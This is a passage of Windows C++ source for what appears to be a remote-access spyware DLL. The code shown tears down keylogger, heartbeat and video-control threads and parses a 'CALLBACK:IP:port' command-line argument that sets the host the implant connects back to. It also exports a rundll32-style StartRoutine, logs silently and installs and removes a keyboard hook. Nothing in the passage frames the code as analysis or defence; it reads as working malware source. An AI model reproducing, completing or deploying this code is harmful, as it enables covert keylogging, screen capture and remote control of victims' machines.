    if (g_keylogThread) {
        WaitForSingleObject(g_keylogThread, 2000);
        CloseHandle(g_keylogThread);
        g_keylogThread = nullptr;
    }
    if (g_heartbeatThread) {
        WaitForSingleObject(g_heartbeatThread, 2000);
        CloseHandle(g_heartbeatThread);
        g_heartbeatThread = nullptr;
    }
    if (g_videoControlThread) {
        WaitForSingleObject(g_videoControlThread, 2000);
        CloseHandle(g_videoControlThread);
        g_videoControlThread = nullptr;
    }
    if (g_clientSocket != INVALID_SOCKET) {
        shutdown(g_clientSocket, SD_BOTH);
        closesocket(g_clientSocket);
    }
    if (g_serverSocket != INVALID_SOCKET) {
        closesocket(g_serverSocket);
    }

    WSACleanup();
    if (g_pFactory) g_pFactory->Release();
    CoUninitialize();

    return 0;
}

static void ParseCallbackParamMon(const std::string& cmdLine) {
    std::string s = cmdLine;

    size_t start = s.find_first_not_of(" \t");
    if (start != std::string::npos) s = s.substr(start);

    if (!s.empty() && s[0] == '|') s = s.substr(1);

    const std::string prefix = "CALLBACK:";
    if (s.find(prefix) != 0) {
        LogSilent("ParseCallbackParamMon: no CALLBACK prefix in: " + cmdLine);
        return;
    }

    std::string addrPart = s.substr(prefix.size());
    size_t colonPos = addrPart.rfind(':');
    if (colonPos == std::string::npos) return;

    g_callback_ip_mon = addrPart.substr(0, colonPos);
    g_callback_port_mon = std::stoi(addrPart.substr(colonPos + 1));

    LogSilent("ParseCallbackParamMon: IP=" + g_callback_ip_mon +
        " Port=" + std::to_string(g_callback_port_mon));
}

extern "C" __declspec(dllexport) void ModuleMain() {
    g_running = true;
    g_stop_requested = false;
    g_captureThread = CreateThread(NULL, 0, CaptureThread, NULL, 0, NULL);
}

extern "C" __declspec(dllexport)
void CALLBACK StartRoutine(HWND hwnd, HINSTANCE hinst,
    LPSTR lpszCmdLine, int nCmdShow) {
    LogSilent("StartRoutine called");
    LogSilent("lpszCmdLine: " + std::string(lpszCmdLine ? lpszCmdLine : "(null)"));

    if (lpszCmdLine && strlen(lpszCmdLine) > 0) {
        ParseCallbackParamMon(std::string(lpszCmdLine));
    }
    ModuleMain();
    if (g_captureThread) {
        WaitForSingleObject(g_captureThread, INFINITE);
        CloseHandle(g_captureThread);
        g_captureThread = nullptr;
    }
}

extern "C" __declspec(dllexport) void StopCapture() {
    g_stop_requested = true;
    g_running = false;
    g_session_active = false;
    g_keylogger_enabled = false;

    if (g_keyboardHook) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = nullptr;
    }

    if (g_clientSocket != INVALID_SOCKET) {
        shutdown(g_clientSocket, SD_BOTH);
        closesocket(g_clientSocket);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_PROCESS_DETACH:
        g_running = false;
        g_stop_requested = true;
        g_session_active = false;
        g_keylogger_enabled = false;
        if (g_keyboardHook) {
            UnhookWindowsHookEx(g_keyboardHook);
            g_keyboardHook = nullptr;
        }
        break;
    }
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    g_running = true;

    HANDLE hMain = CreateThread(NULL, 0, CaptureThread, NULL, 0, NULL);

    if (hMain) {

        WaitForSingleObject(hMain, INFINITE);
        CloseHandle(hMain);
    }

    return 0;
}